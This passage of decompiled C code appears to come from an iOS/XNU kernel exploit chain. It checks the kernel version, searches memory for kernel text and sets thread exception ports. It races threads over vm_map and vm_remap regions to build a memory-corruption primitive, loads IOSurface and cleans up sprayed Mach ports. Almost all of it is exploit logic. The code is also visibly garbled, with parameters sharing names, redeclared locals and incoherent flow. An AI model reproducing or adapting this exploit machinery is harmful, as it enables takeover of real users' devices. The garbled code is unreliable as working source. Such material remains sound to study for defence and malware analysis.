  host_info[0xe9] = '\0';
  host_info[0xea] = '\0';
  host_info[0xeb] = '\0';
  host_info[0xec] = '\0';
  host_info[0xed] = '\0';
  host_info[0xee] = '\0';
  host_info[0xef] = '\0';
  host_info[0xe0] = '\0';
  host_info[0xe1] = '\0';
  host_info[0xe2] = '\0';
  host_info[0xe3] = '\0';
  host_info[0xe4] = '\0';
  host_info[0xe5] = '\0';
  host_info[0xe6] = '\0';
  host_info[0xe7] = '\0';
  host_info[0xf8] = '\0';
  host_info[0xf9] = '\0';
  host_info[0xfa] = '\0';
  host_info[0xfb] = '\0';
  host_info[0xfc] = '\0';
  host_info[0xfd] = '\0';
  host_info[0xfe] = '\0';
  host_info[0xff] = '\0';
  host_info[0xf0] = '\0';
  host_info[0xf1] = '\0';
  host_info[0xf2] = '\0';
  host_info[0xf3] = '\0';
  host_info[0xf4] = '\0';
  host_info[0xf5] = '\0';
  host_info[0xf6] = '\0';
  host_info[0xf7] = '\0';
  host_info[200] = '\0';
  host_info[0xc9] = '\0';
  host_info[0xca] = '\0';
  host_info[0xcb] = '\0';
  host_info[0xcc] = '\0';
  host_info[0xcd] = '\0';
  host_info[0xce] = '\0';
  host_info[0xcf] = '\0';
  host_info[0xc0] = '\0';
  host_info[0xc1] = '\0';
  host_info[0xc2] = '\0';
  host_info[0xc3] = '\0';
  host_info[0xc4] = '\0';
  host_info[0xc5] = '\0';
  host_info[0xc6] = '\0';
  host_info[199] = '\0';
  host_info[0xd8] = '\0';
  host_info[0xd9] = '\0';
  host_info[0xda] = '\0';
  host_info[0xdb] = '\0';
  host_info[0xdc] = '\0';
  host_info[0xdd] = '\0';
  host_info[0xde] = '\0';
  host_info[0xdf] = '\0';
  host_info[0xd0] = '\0';
  host_info[0xd1] = '\0';
  host_info[0xd2] = '\0';
  host_info[0xd3] = '\0';
  host_info[0xd4] = '\0';
  host_info[0xd5] = '\0';
  host_info[0xd6] = '\0';
  host_info[0xd7] = '\0';
  host_info[0xa8] = '\0';
  host_info[0xa9] = '\0';
  host_info[0xaa] = '\0';
  host_info[0xab] = '\0';
  host_info[0xac] = '\0';
  host_info[0xad] = '\0';
  host_info[0xae] = '\0';
  host_info[0xaf] = '\0';
  host_info[0xa0] = '\0';
  host_info[0xa1] = '\0';
  host_info[0xa2] = '\0';
  host_info[0xa3] = '\0';
  host_info[0xa4] = '\0';
  host_info[0xa5] = '\0';
  host_info[0xa6] = '\0';
  host_info[0xa7] = '\0';
  host_info[0xb8] = '\0';
  host_info[0xb9] = '\0';
  host_info[0xba] = '\0';
  host_info[0xbb] = '\0';
  host_info[0xbc] = '\0';
  host_info[0xbd] = '\0';
  host_info[0xbe] = '\0';
  host_info[0xbf] = '\0';
  host_info[0xb0] = '\0';
  host_info[0xb1] = '\0';
  host_info[0xb2] = '\0';
  host_info[0xb3] = '\0';
  host_info[0xb4] = '\0';
  host_info[0xb5] = '\0';
  host_info[0xb6] = '\0';
  host_info[0xb7] = '\0';
  host_info[0x88] = '\0';
  host_info[0x89] = '\0';
  host_info[0x8a] = '\0';
  host_info[0x8b] = '\0';
  host_info[0x8c] = '\0';
  host_info[0x8d] = '\0';
  host_info[0x8e] = '\0';
  host_info[0x8f] = '\0';
  host_info[0x80] = '\0';
  host_info[0x81] = '\0';
  host_info[0x82] = '\0';
  host_info[0x83] = '\0';
  host_info[0x84] = '\0';
  host_info[0x85] = '\0';
  host_info[0x86] = '\0';
  host_info[0x87] = '\0';
  host_info[0x98] = '\0';
  host_info[0x99] = '\0';
  host_info[0x9a] = '\0';
  host_info[0x9b] = '\0';
  host_info[0x9c] = '\0';
  host_info[0x9d] = '\0';
  host_info[0x9e] = '\0';
  host_info[0x9f] = '\0';
  host_info[0x90] = '\0';
  host_info[0x91] = '\0';
  host_info[0x92] = '\0';
  host_info[0x93] = '\0';
  host_info[0x94] = '\0';
  host_info[0x95] = '\0';
  host_info[0x96] = '\0';
  host_info[0x97] = '\0';
  host_info[0x78] = '\0';
  host_info[0x79] = '\0';
  host_info[0x7a] = '\0';
  host_info[0x7b] = '\0';
  host_info[0x7c] = '\0';
  host_info[0x7d] = '\0';
  host_info[0x7e] = '\0';
  host_info[0x7f] = '\0';
  host_info[0x70] = '\0';
  host_info[0x71] = '\0';
  host_info[0x72] = '\0';
  host_info[0x73] = '\0';
  host_info[0x74] = '\0';
  host_info[0x75] = '\0';
  host_info[0x76] = '\0';
  host_info[0x77] = '\0';
  host_info[0x58] = '\0';
  host_info[0x59] = '\0';
  host_info[0x5a] = '\0';
  host_info[0x5b] = '\0';
  host_info[0x5c] = '\0';
  host_info[0x5d] = '\0';
  host_info[0x5e] = '\0';
  host_info[0x5f] = '\0';
  host_info[0x50] = '\0';
  host_info[0x51] = '\0';
  host_info[0x52] = '\0';
  host_info[0x53] = '\0';
  host_info[0x54] = '\0';
  host_info[0x55] = '\0';
  host_info[0x56] = '\0';
  host_info[0x57] = '\0';
  host_info[0x68] = '\0';
  host_info[0x69] = '\0';
  host_info[0x6a] = '\0';
  host_info[0x6b] = '\0';
  host_info[0x6c] = '\0';
  host_info[0x6d] = '\0';
  host_info[0x6e] = '\0';
  host_info[0x6f] = '\0';
  host_info[0x60] = '\0';
  host_info[0x61] = '\0';
  host_info[0x62] = '\0';
  host_info[99] = '\0';
  host_info[100] = '\0';
  host_info[0x65] = '\0';
  host_info[0x66] = '\0';
  host_info[0x67] = '\0';
  host_info[0x38] = '\0';
  host_info[0x39] = '\0';
  host_info[0x3a] = '\0';
  host_info[0x3b] = '\0';
  host_info[0x3c] = '\0';
  host_info[0x3d] = '\0';
  host_info[0x3e] = '\0';
  host_info[0x3f] = '\0';
  host_info[0x30] = '\0';
  host_info[0x31] = '\0';
  host_info[0x32] = '\0';
  host_info[0x33] = '\0';
  host_info[0x34] = '\0';
  host_info[0x35] = '\0';
  host_info[0x36] = '\0';
  host_info[0x37] = '\0';
  host_info[0x48] = '\0';
  host_info[0x49] = '\0';
  host_info[0x4a] = '\0';
  host_info[0x4b] = '\0';
  host_info[0x4c] = '\0';
  host_info[0x4d] = '\0';
  host_info[0x4e] = '\0';
  host_info[0x4f] = '\0';
  host_info[0x40] = '\0';
  host_info[0x41] = '\0';
  host_info[0x42] = '\0';
  host_info[0x43] = '\0';
  host_info[0x44] = '\0';
  host_info[0x45] = '\0';
  host_info[0x46] = '\0';
  host_info[0x47] = '\0';
  host_info[0x18] = '\0';
  host_info[0x19] = '\0';
  host_info[0x1a] = '\0';
  host_info[0x1b] = '\0';
  host_info[0x1c] = '\0';
  host_info[0x1d] = '\0';
  host_info[0x1e] = '\0';
  host_info[0x1f] = '\0';
  host_info[0x10] = '\0';
  host_info[0x11] = '\0';
  host_info[0x12] = '\0';
  host_info[0x13] = '\0';
  host_info[0x14] = '\0';
  host_info[0x15] = '\0';
  host_info[0x16] = '\0';
  host_info[0x17] = '\0';
  host_info[0x28] = '\0';
  host_info[0x29] = '\0';
  host_info[0x2a] = '\0';
  host_info[0x2b] = '\0';
  host_info[0x2c] = '\0';
  host_info[0x2d] = '\0';
  host_info[0x2e] = '\0';
  host_info[0x2f] = '\0';
  host_info[0x20] = '\0';
  host_info[0x21] = '\0';
  host_info[0x22] = '\0';
  host_info[0x23] = '\0';
  host_info[0x24] = '\0';
  host_info[0x25] = '\0';
  host_info[0x26] = '\0';
  host_info[0x27] = '\0';
  host_info[8] = '\0';
  host_info[9] = '\0';
  host_info[10] = '\0';
  host_info[0xb] = '\0';
  host_info[0xc] = '\0';
  host_info[0xd] = '\0';
  host_info[0xe] = '\0';
  host_info[0xf] = '\0';
  host_info[0] = '\0';
  host_info[1] = '\0';
  host_info[2] = '\0';
  host_info[3] = '\0';
  host_info[4] = '\0';
  host_info[5] = '\0';
  host_info[6] = '\0';
  host_info[7] = '\0';
  host = _mach_host_self();
  lk1 = _host_kernel_version(host,host_info);
  if (lk1 != 0) {
    if (lk1 != 0x35) {
      return;
    }
    thread_attr[0] = 1;
    thread_attr[1] = 4;
    scratch = 0x200;
    err = _sysctl(thread_attr,2,host_info,&scratch,(void *)0x0,0);
    if (err != 0) {
      return;
    }
  }
  ptr = _strstr(host_info,"RELEASE");
  if ((ptr != (char *)0x0) && (ptr = _strstr(host_info,"xnu-"), ptr != (char *)0x0)) {
    bootargs = 0;
    scratch = 0;
    err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
    if (err == 3) {
      *len = scratch;
      *(uint32_t *)(len + 1) = bootargs;
    }
  }
  return;
}





void coruna_kernel09_residual_253(void)
{
  DataSynchronizationBarrier(3,3,0);
  InstructionSynchronizationBarrier();
  return;
}
uint32_t coruna_kernel6544_via_nop_stub_3(long handle,unsigned long arg,uint64_t val)
{
  long handle;
  uint u;
  uint size;
  unsigned long version;
  int err;
  unsigned long port;
  uint32_t tag;
  uint32_t kind;
  long addr;
  uint32_t type_id;
  unsigned long type_id_8;
  int scratch;
  uint64_t bootargs[5];
  unsigned long thread_attr [4];
  unsigned long host_info;
  unsigned long *serial_buf;
  uint8_t ***action;
  uint32_t block_ctx;
  unsigned long stack_guard [2];
  unsigned long *sa_saved;
  unsigned long sa_new [2];
  long path_buf;
  long tmp_buf;
  long region;
  uint8_t **plist;
  unsigned long *url_buf;
  char json_buf;
  unsigned long frame;
  long work;
  
  work = *(long *)k_kernel_stack_chk_guard_slot;
  type_id = 0xad00b;
  err = coruna_mach_absolute_time_1b5b4(handle,7,&k_kernel_slot_2710);
  if (err != 0) {
    kind = 0xad022;
    if (*(long *)k_kernel_stack_chk_guard_slot != work) {
    ___stack_chk_fail();
    }
    return kind;
  }
  if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) ||
     (addr = *(long *)(*(long *)(handle + 0x118) + 0x158), addr == 0)) {
    sa_saved = sa_new;
    plist = &ptr_kernel6544_fn_3c918;
    url_buf = sa_saved;
    err = coruna_uname(&k_kernel_rodata_word_400d8);
    kind = type_id;
    if (err == 0) {
      tag = 0x28026;
      region = handle;
      coruna_kernel6544_residual_242(sa_new,*(uint64_t *)(&k_kernel_slot_19c8 + handle));
      path_buf = coruna_kernel6544_via_return_zero_2b000(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
      kind = 0x2801b;
      if (((path_buf != 0) && (tmp_buf = coruna_return_zero_2b488(handle,path_buf), tmp_buf != 0)) &&
         ((err = coruna_find_text_exec_383b8(stack_guard), kind = type_id, err == 0 &&
          (err = coruna_return_zero_ada8(0x40000,stack_guard), err == 0)))) {
        err = coruna_thread_set_exception_ports(&plist);
        if (err == 0) {
          err = coruna_thread_policy_set_1b42c_2(&k_kernel_rodata_word_40048,stack_guard,sa_new);
          if (err != 0) goto done;
          action = &plist;
          block_ctx = 0;
          serial_buf = sa_new;
          err = coruna_thread_policy_set_1b42c(&serial_buf);
          if (err != 0) goto done;
          coruna_vm_deallocate_127c0(&plist);
          scratch = *(int *)(handle + 0x180) << 1;
          addr = coruna_mach_port_request_notification(handle,&scratch);
          if (addr == 0) {
            kind = 0xad009;
            coruna_slot_clear(handle,7);
            if (*(long *)k_kernel_stack_chk_guard_slot != work) {
            ___stack_chk_fail();
            }
            return kind;
          }
          err = coruna_nop_stub_3(handle,addr,thread_attr);
          kind = tag;
          if (((err == 0) ||
              (err = coruna_nop_stub_3(handle,addr + (unsigned long)*(uint *)(handle + 0x180),bootargs),
              err == 0)) ||
             (port = coruna_return_zero_30adc(handle,bootargs[0]), version = thread_attr[0], port == 0))
          coruna_slot_clear(handle,7);
          if (*(long *)k_kernel_stack_chk_guard_slot != work) {
          ___stack_chk_fail();
          }
          return kind;
        }
        else {
done:
          coruna_vm_deallocate_127c0(&plist);
        }
        kind = 0xad00b;
      }
    }
  }
  else {
check_ok:
    err = coruna_nop_stub_3(handle,arg,&plist);
    kind = 0x28026;
    if (err != 0) {
      if (json_buf == '\x03') {
        u = *(uint *)(handle + 0x180);
        size = 0;
        if (u != 0) {
          size = (u + (int)addr & 0x1ffffff) / u;
        }
        handle = addr + (unsigned long)(size << 3);
        err = coruna_nop_stub_6(handle,handle,8,sa_new);
        if (err == 0) {
          kind = 0x2800f;
        }
        else {
          thread_attr[0] = sa_new[0] & 0xffff000000000000 |
                         sa_new[0] & 0x3fff | (frame >> 0xe & 0x3ffffffff) << 0xe;
          if (thread_attr[0] != sa_new[0]) {
            err = coruna_nop_stub_7(handle,handle,thread_attr,8);
            if (err == 0) {
              kind = 0x28010;
              coruna_slot_clear(handle,7);
              if (*(long *)k_kernel_stack_chk_guard_slot != work) {
              ___stack_chk_fail();
              }
              return kind;
            }
            coruna_semaphore_timedwait(handle,&k_kernel_slot_2710);
          }
          err = coruna_mach_vm_machine_attribute(handle,addr + (unsigned long)*(uint *)(handle + 0x180) +
                                       (*(unsigned long *)(handle + 0x188) & arg),val);
          kind = 0x28010;
          if (err != 0) {
            kind = 0;
          }
        }
      }
      else {
        kind = 0x28011;
      }
    }
  }
cleanup:
  coruna_slot_clear(handle,7);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != work) {
    ___stack_chk_fail();
  }
  return kind;
}





void coruna_kernel6544_residual_242(unsigned long *arg,unsigned long arg)
{
  int err;
  long handle;
  unsigned long u;
  
  arg = arg & 0xffffffffffffc000;
  while( true ) {
    *arg = arg;
    err = coruna_kernel6544_residual_244(arg);
    if ((((err == -0x1120531) && (err = coruna_kernel6544_residual_244(arg,*arg + 4), err == 0x100000c))
        && (err = coruna_kernel6544_residual_244(arg,*arg + 8), err == 2)) &&
       (err = coruna_kernel6544_residual_244(arg,*arg + 0xc), err == 0xc)) break;
    arg = *arg - 0x4000;
  }
  u = *arg;
  handle = coruna_kernel6544_via_ctx_test_flag_12(arg[4]);
  arg[1] = u - handle;
  return;
}





uint64_t coruna_vm_copy_7ee0(long handle)
{
  uint32_t u;
  
  u = coruna_kernel6544_residual_250();
  *(uint32_t *)(handle + 0x34) = u;
  _vm_copy(*(vm_map_t *)k_kernel_mach_task_self_slot,*(vm_address_t *)(handle + 0x10),
           *(long *)(handle + 0x20) + *(long *)(handle + 0x28),*(vm_address_t *)(handle + 0x18));
  return 0;
}





uint64_t coruna_arc4random(uint64_t *val)
{
  u_int32_t u;
  uint32_t size;
  uint64_t version;
  
  if (*(char *)(val + 7) != '\0') {
    version = *val;
    u = _arc4random();
    coruna_semaphore_timedwait(version,u & 0xf);
  }
  size = coruna_kernel6544_residual_250();
  *(uint32_t *)(val + 6) = size;
  _mlock(val[1],val[4]);
  return 0;
}
unsigned long coruna_pthread_attr_set_qos_class_np(uint64_t arg,long val,int n,long *m,vm_address_t *p)
{
  unsigned long size;
  vm_size_t lv1;
  uint8_t *buf;
  uint8_t *str;
  uint size;
  int err;
  vm_map_t target_task;
  void **lppv6;
  vm_address_t address;
  vm_size_t lv7;
  unsigned long tag;
  long addr;
  vm_address_t lv10;
  unsigned long kind;
  uint64_t *copy;
  long *ptr;
  int status;
  uint64_t type_id;
  long off;
  unsigned long type_id_8;
  unsigned long size_00;
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_11;
  unsigned long type_id_12;
  vm_inherit_t in_stack_fffffffffffffdf0;
  vm_inherit_t inheritance;
  vm_address_t bootargs;
  uint64_t thread_attr;
  long *host_info;
  uint64_t *serial_buf;
  vm_address_t action;
  unsigned long scratch;
  vm_size_t block_ctx;
  uint64_t bootargs;
  uint64_t stack_guard;
  pthread_t sa_saved;
  pthread_t sa_new;
  uint64_t *path_buf;
  long *tmp_buf;
  long *region;
  vm_address_t plist;
  pthread_attr_t url_buf;
  pthread_attr_t json_buf;
  vm_address_t frame [10];
  bool skip_kind_reset;
  
  frame[8] = *(vm_address_t *)k_kernel_stack_chk_guard_slot;
  size_00 = *(long *)k_kernel_vm_page_size_slot * (unsigned long)(n + 1);
  lv7 = *(long *)k_kernel_vm_page_size_slot * 3;
  path_buf = (uint64_t *)0x0;
  type_id = *(uint64_t *)(&k_kernel_slot_3510 + val);
  size = lv7 + size_00;
  size = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t *)&path_buf,size,1)
  ;
  buf = k_kernel_mach_task_self_slot;
  tag = (unsigned long)size;
  kind = tag;
  if (size == 0) {
    frame[0] = (long)path_buf + lv7;
    size = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,frame,size_00,0,0x4000,0,0,0,3,1,
                    in_stack_fffffffffffffdf0);
    str = k_kernel_vm_page_size_slot;
    tag = (unsigned long)size;
    kind = tag;
    if (size == 0) {
      tag = *(unsigned long *)k_kernel_vm_page_size_slot;
      if (tag <= size) {
        kind = 0;
        type_id_8 = 0;
        if (tag != 0) {
          type_id_8 = size / tag;
        }
        if (type_id_8 < 2) {
          type_id_8 = 1;
        }
        copy = path_buf;
        type_id_9 = k_kernel_rodata_word_3b1a0;
        type_id_11 = k_kernel_rodata_word_0003b1a8;
        do {
          if (type_id_9 <= type_id_8 - 1) {
            *copy = type_id;
          }
          if (type_id_11 <= type_id_8 - 1) {
            *(uint64_t *)(tag + (long)copy) = type_id;
          }
          kind = kind + 2;
          type_id_9 = type_id_9 + 2;
          type_id_11 = type_id_11 + 2;
          copy = (uint64_t *)((long)copy + tag * 2);
        } while (kind != (type_id_8 + 1 & 0xfffffffffffffffe));
      }
      tag = _mlock(path_buf,size);
      if ((int)tag == 0) {
        _pthread_attr_init(&json_buf);
        _pthread_attr_set_qos_class_np(&json_buf,0x21,0);
        _pthread_attr_init(&url_buf);
        _pthread_attr_set_qos_class_np(&url_buf,0x15,0);
        off = 0;
        sa_saved = (pthread_t)0x0;
        sa_new = (pthread_t)0x0;
        host_info = (long *)0x0;
        action = 0;
        bootargs = 0;
        serial_buf = path_buf;
        stack_guard = 0;
        addr = *(long *)str;
        lv1 = size + addr * 2;
        frame[5] = 0;
        frame[4] = 0;
        frame[7] = 0;
        frame[6] = 0;
        frame[1] = 0;
        frame[0] = 0;
        frame[3] = 0;
        frame[2] = 0;
        thread_attr = arg;
        scratch = size_00;
        block_ctx = lv7;
        skip_kind_reset = false;
        while( true ) {
          size = _vm_map(*(vm_map_t *)buf,(vm_address_t *)((long)frame + off),
                          lv1 + addr * 2,0x1ffffff,-0x37fffff7,0,0,0,3,1,
                          in_stack_fffffffffffffdf0);
          tag = (unsigned long)size;
          if (size != 3 && size != 0) break;
          if (off == 0x38) {
            off = 0;
            type_id_8 = 0;
            do {
              if (off != 0) {
                size = (uint)off;
                if (frame[off] <= frame[type_id_8]) {
                  size = (uint)type_id_8;
                }
                type_id_8 = (unsigned long)size;
              }
              off = off + 1;
            } while (off != 8);
            if (frame[type_id_8] == 0) {
              bootargs = 0;
              tag = 0;
              kind = 3;
            }
            else {
              tag = _mlock(frame[type_id_8],lv1 + *(long *)str * 2);
              if ((int)tag == 0) {
                plist = *(long *)str + frame[type_id_8];
                size = _vm_allocate(*(vm_map_t *)buf,&plist,lv1,0x4000);
                tag = (unsigned long)size;
                kind = tag;
                if (size == 0) {
                  lv10 = frame[type_id_8];
                  *p = lv10;
                  p[1] = lv10 + lv1 + *(long *)str;
                  bootargs = plist;
                  frame[type_id_8] = 0;
                }
                else {
                  bootargs = 0;
                }
              }
              else {
                bootargs = 0;
                kind = 5;
              }
            }
            skip_kind_reset = true;
            break;
          }
          addr = *(long *)str;
          off = off + 8;
        }
        if (!skip_kind_reset) {
          bootargs = 0;
          kind = tag;
        }
fail:
        off = 0;
        do {
          if (*(vm_address_t *)((long)frame + off) != 0) {
            size = _vm_deallocate(*(vm_map_t *)buf,*(vm_address_t *)((long)frame + off),
                                   lv1 + *(long *)str * 2);
            tag = (unsigned long)size;
            *(uint64_t *)((long)frame + off) = 0;
          }
          type_id_9 = k_kernel_rodata_word_0003b1a8;
          type_id_8 = k_kernel_rodata_word_3b1a0;
          off = off + 8;
        } while (off != 0x40);
        if ((int)kind == 0) {
          off = *(long *)(&k_kernel_slot_3518 + val);
          status = 1;
          lv10 = 0;
          int vm_epilogue = 0;
          do {
            frame[0] = 0;
            lv1 = size + *(long *)str * 2;
            size = _vm_allocate(*(vm_map_t *)buf,frame,lv1,1);
            kind = (unsigned long)size;
            if (size != 0) {
              address = lv10;
              if (address == 0) {
                vm_epilogue = 2;
              }
              else {
                target_task = *(vm_map_t *)buf;
                lv7 = size + *(long *)str * 2;
                _vm_deallocate(*(vm_map_t *)buf,address,lv7);
                target_task = *(vm_map_t *)buf;
                address = address + size;
                lv7 = *(long *)str << 1;
                vm_epilogue = 1;
              }
              break;
            }
            plist = bootargs;
            region = (long *)((unsigned long)region & 0xffffffff00000000);
            tmp_buf = (long *)((unsigned long)tmp_buf & 0xffffffff00000000);
            inheritance = 1;
            size = _vm_remap(*(vm_map_t *)buf,&plist,lv1,0,0x4000,*(vm_map_t *)buf,
                              frame[0],0,(vm_prot_t *)&region,(vm_prot_t *)&tmp_buf,1);
            kind = (unsigned long)size;
            if (size != 0) {
              address = lv10;
              if (address == 0) {
                vm_epilogue = 2;
              }
              else {
                target_task = *(vm_map_t *)buf;
                lv7 = size + *(long *)str * 2;
                _vm_deallocate(*(vm_map_t *)buf,address,lv7);
                target_task = *(vm_map_t *)buf;
                address = address + size;
                lv7 = *(long *)str << 1;
                vm_epilogue = 1;
              }
              break;
            }
            size = _vm_deallocate(*(vm_map_t *)buf,frame[0],lv1);
            kind = (unsigned long)size;
            if (size != 0) {
              address = lv10;
              if (address == 0) {
                vm_epilogue = 2;
              }
              else {
                target_task = *(vm_map_t *)buf;
                lv7 = size + *(long *)str * 2;
                _vm_deallocate(*(vm_map_t *)buf,address,lv7);
                target_task = *(vm_map_t *)buf;
                address = address + size;
                lv7 = *(long *)str << 1;
                vm_epilogue = 1;
              }
              break;
            }
            region = (long *)(plist + lv7);
            size = _vm_map(*(vm_map_t *)buf,(vm_address_t *)&region,
                            size_00 + *(long *)str * 2,0,0x3004000,0,0,0,3,1,inheritance);
            kind = (unsigned long)size;
            if (size != 0) {
              address = lv10;
              if (address == 0) {
                vm_epilogue = 2;
              }
              else {
                target_task = *(vm_map_t *)buf;
                lv7 = size + *(long *)str * 2;
                _vm_deallocate(*(vm_map_t *)buf,address,lv7);
                target_task = *(vm_map_t *)buf;
                address = address + size;
                lv7 = *(long *)str << 1;
                vm_epilogue = 1;
              }
              break;
            }
            kind = *(unsigned long *)str;
            tag = 0;
            if (kind != 0) {
              tag = size_00 / kind;
            }
            if (tag != 1) {
              type_id_11 = 0;
              ptr = region;
              type_id_10 = type_id_8;
              type_id_12 = type_id_9;
              do {
                if (type_id_10 <= tag - 2) {
                  *ptr = off;
                }
                if (type_id_12 <= tag - 2) {
                  *(long *)(kind + (long)ptr) = off;
                }
                type_id_11 = type_id_11 + 2;
                type_id_10 = type_id_10 + 2;
                type_id_12 = type_id_12 + 2;
                ptr = (long *)((long)ptr + kind * 2);
              } while (type_id_11 != (tag & 0xfffffffffffffffe));
            }
            tmp_buf = (long *)((long)region + size_00);
            size = _vm_allocate(*(vm_map_t *)buf,(vm_address_t *)&tmp_buf,kind,0x4000);
            address = plist;
            kind = (unsigned long)size;
            if (size != 0) {
              address = lv10;
              if (address == 0) {
                vm_epilogue = 2;
              }
              else {
                target_task = *(vm_map_t *)buf;
                lv7 = size + *(long *)str * 2;
                _vm_deallocate(*(vm_map_t *)buf,address,lv7);
                target_task = *(vm_map_t *)buf;
                address = address + size;
                lv7 = *(long *)str << 1;
                vm_epilogue = 1;
              }
              break;
            }
            ptr = (long *)(plist + lv7);
            action = plist;
            host_info = ptr;
            lppv6 = (void **)coruna_fn_ptr_cast(coruna_vm_copy);
            err = _pthread_create(&sa_new,&json_buf,lppv6,&thread_attr);
            if (err != 0) break;
            lppv6 = (void **)coruna_fn_ptr_cast(coruna_arc4random);
            err = _pthread_create(&sa_saved,&url_buf,lppv6,&thread_attr);
            if (err != 0) break;
            _pthread_join(sa_new,(void **)0x0);
            sa_new = (pthread_t)0x0;
            _pthread_join(sa_saved,(void **)0x0);
            sa_saved = (pthread_t)0x0;
            frame[0] = (long)ptr + *(vm_size_t *)str + size_00;
            size = _vm_allocate(*(vm_map_t *)buf,frame,*(vm_size_t *)str,0x4000);
            kind = (unsigned long)size;
            lv10 = address;
            if (size != 0) {
              address = lv10;
              if (address == 0) {
                vm_epilogue = 2;
              }
              else {
                target_task = *(vm_map_t *)buf;
                lv7 = size + *(long *)str * 2;
                _vm_deallocate(*(vm_map_t *)buf,address,lv7);
                target_task = *(vm_map_t *)buf;
                address = address + size;
                lv7 = *(long *)str << 1;
                vm_epilogue = 1;
              }
              break;
            }
            off = *(long *)(&k_kernel_slot_3518 + val);
            if ((*ptr == off) &&
               (*(long *)((long)ptr + (size_00 - *(long *)str)) ==
                *(long *)(&k_kernel_slot_3510 + val))) {
              *m = (long)ptr;
              off = *(long *)str;
              *(int *)(m + 4) = n;
              m[1] = size_00 - off;
              m[2] = size_00;
              address = lv10;
              if (address == 0) {
                vm_epilogue = 2;
              }
              else {
                target_task = *(vm_map_t *)buf;
                lv7 = size + *(long *)str * 2;
                _vm_deallocate(*(vm_map_t *)buf,address,lv7);
                target_task = *(vm_map_t *)buf;
                address = address + size;
                lv7 = *(long *)str << 1;
                vm_epilogue = 1;
              }
              break;
            }
            status = status + 1;
          } while (status != 0x8001);
          kind = 5;
          if (vm_epilogue != 2 && address != 0) {
            target_task = *(vm_map_t *)buf;
            lv7 = size + *(long *)str * 2;
            _vm_deallocate(target_task,address,lv7);
          }
cleanup:
          if (path_buf != (uint64_t *)0x0) {
            _vm_deallocate(*(vm_map_t *)buf,(vm_address_t)path_buf,size);
          }
          _pthread_attr_destroy(&json_buf);
          size = _pthread_attr_destroy(&url_buf);
          tag = (unsigned long)size;
        }
      }
      else {
        kind = 5;
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == frame[8]) {
    return kind;
  }
  ___stack_chk_fail(tag);
}





void coruna_call_pthread_attr_setdetachstate_cb98(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_pthread_attr_setdetachstate_cb98(val,1,off_4);
  return;
}





uint coruna_pthread_attr_setdetachstate_cb98(uint64_t val,uint64_t id_2,uint32_t *size)
{
  vm_map_t target_task;
  mach_port_name_t name;
  uint8_t *ptr;
  uint u;
  void **lppv3;
  void *ptr;
  uint size;
  unsigned long version;
  long handle;
  uint8_t u[12];
  uint32_t scratch[2824];
  vm_address_t bootargs;
  vm_size_t thread_attr;
  vm_address_t host_info;
  vm_size_t serial_buf;
  mach_port_name_t action [524];
  mach_port_name_t block_ctx;
  void *stack_guard;
  uint sa_saved;
  vm_address_t sa_new;
  vm_size_t path_buf;
  vm_address_t tmp_buf;
  vm_size_t region;
  mach_port_name_t plist [18];
  mach_port_name_t url_buf;
  uint8_t *json_buf;
  uint32_t *frame;
  uint64_t work;
  pthread_t cache;
  pthread_attr_t cache_20;
  long cache_21;
  
  u = (*(void (*)k_kernel_chkstk_darwin_slot)();
  cache_21 = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(scratch,0x3520);
  scratch[0] = u;
  u = _pthread_attr_init(&cache_20);
  if (u == 0) {
    u = _pthread_attr_setdetachstate(&cache_20,1);
    if (u == 0) {
      cache = (pthread_t)0x0;
      frame = scratch;
      json_buf = &k_kernel_slot_1001;
      work = u;
      lppv3 = (void **)coruna_fn_ptr_cast(coruna_call_dlopen_iosurface);
      u = _pthread_create(&cache,&cache_20,lppv3,&json_buf);
      if ((u == 0) && (u = _pthread_join(cache,(void **)0x0), u == 0)) {
        size = (uint)json_buf;
        _pthread_attr_destroy(&cache_20);
        if (size == 0) {
          *size = 0;
        }
        goto code_r0x00007718;
      }
    }
    size = -u;
    if (-1 < (int)u) {
      size = u;
    }
    size = size | 0x40000000;
    _pthread_attr_destroy(&cache_20);
  }
  else {
    size = -u;
    if (-1 < (int)u) {
      size = u;
    }
    size = size | 0x40000000;
  }
code_r0x00007718:
  ptr = k_kernel_mach_task_self_slot;
  target_task = *(vm_map_t *)k_kernel_mach_task_self_slot;
  if ((bootargs != 0) && (thread_attr != 0)) {
    _vm_deallocate(target_task,bootargs,thread_attr);
    bootargs = 0;
    thread_attr = 0;
  }
  if ((host_info != 0) && (serial_buf != 0)) {
    _vm_deallocate(*(vm_map_t *)ptr,host_info,serial_buf);
    host_info = 0;
    serial_buf = 0;
  }
  handle = 0;
  do {
    if (1 < *(mach_port_name_t *)((long)action + handle) + 1) {
      _mach_port_mod_refs(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)action + handle),1,-1
                         );
    }
    *(uint32_t *)((long)action + handle) = 0;
    handle = handle + 4;
  } while (handle != 0x400);
  handle = 0;
  do {
    if (1 < *(mach_port_name_t *)((long)plist + handle) + 1) {
      _mach_port_mod_refs(target_task,*(mach_port_name_t *)((long)plist + handle),1,-1);
      *(uint32_t *)((long)plist + handle) = 0;
    }
    handle = handle + 4;
  } while (handle != 0x40);
  if ((tmp_buf != 0) && (region != 0)) {
    _vm_deallocate(target_task,tmp_buf,region);
    tmp_buf = 0;
    region = 0;
  }
  if ((sa_new != 0) && (path_buf != 0)) {
    _vm_deallocate(target_task,sa_new,path_buf);
    sa_new = 0;
    path_buf = 0;
  }
  if (1 < block_ctx + 1) {
    _mach_port_deallocate(target_task,block_ctx);
    block_ctx = 0;
  }
  if (1 < url_buf + 1) {
    _mach_port_deallocate(target_task,url_buf);
    url_buf = 0;
  }
  if (stack_guard != (void *)0x0) {
    ptr = stack_guard;
    if (sa_saved != 0) {
      version = 0;
      u = sa_saved;
      do {
        name = *(mach_port_name_t *)((long)ptr + version * 4);
        if (1 < name + 1) {
          _mach_port_deallocate(target_task,name);
          *(uint32_t *)((long)stack_guard + version * 4) = 0;
          ptr = stack_guard;
          u = sa_saved;
        }
        version = version + 1;
      } while (version < u);
    }
